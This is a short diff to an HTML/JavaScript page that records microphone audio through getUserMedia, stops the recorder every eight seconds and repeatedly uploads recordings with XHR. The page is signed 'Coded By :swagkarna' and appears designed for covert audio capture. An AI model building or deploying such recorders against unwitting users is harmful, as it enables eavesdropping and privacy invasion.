@@ -34,17 +34,16 @@ navigator.mediaDevices.getUserMedia({ audio: true })
           xhr.send(hande);
     });
 
-  
+  setInterval(() => {
             
         
       mediaRecorder.stop()
-       
+          
+    }, 8000);
+  
+})
 
- 
-  })}  
- 
-
-
+}
 
 setInterval(function(){
     storeaudio()
@@ -61,5 +60,6 @@ setInterval(function(){
 			<b>Coded By :swagkarna</b></p></div>
 		</center>
       </p>
+
    </body>
 </html>
